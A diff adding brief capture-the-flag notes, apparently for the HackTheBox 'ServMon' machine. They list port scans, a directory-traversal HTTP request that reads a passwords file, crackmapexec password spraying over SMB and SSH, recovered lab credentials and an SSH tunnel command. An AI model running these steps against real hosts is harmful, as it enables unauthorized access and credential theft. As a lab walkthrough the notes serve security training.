@@ -1,0 +1,21 @@
+nmap -sC -sV -Pn 10.129.48.113 > nmap.txt
+
+
+gobuster dir  -u http://10.129.48.113/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x txt,php  > gobuster.txt
+
+
+
+
+1.nmap掃描出21 80 445 8443端口,80port是vnms
+2.ftp找到confidentail及notes todo.txt
+3.searsploit可以找到nvms的LFI,查找到密碼
+GET /../../../../../../../../../../../../users/Nathan/desktop/passwords.txt HTTP/1.1
+4.使用crackmapexec找出samba密碼Nadine:L1k3B1gBut7s@W0rk但不可用
+poetry run crackmapexec smb 10.129.48.113 -u ~/timmy/hackthebox/ServMon/users.txt -p ~/timmy/hackthebox/ServMon/passwords.txt
+5.使用crackmapexec找出ssh密碼Nadine:L1k3B1gBut7s@W0rk
+poetry run crackmapexec ssh 10.129.48.113 -u ~/timmy/hackthebox/ServMon/users.txt -p ~/timmy/hackthebox/ServMon/passwords.txt
+6.ssh Nadine@10.129.48.113 登入到victim
+7.在C:\Program Files\NSClient++\nsclient.ini找到密碼ew2x6SsGTxjRwXOT
+8.利用ssh做tunnel把8443隧道回本地,從本地訪問,
+ssh -L8443:localhost:8443 Nadine@10.129.154.34
+9.參考ippsec影片必須使用chrome瀏覽器NSCclient
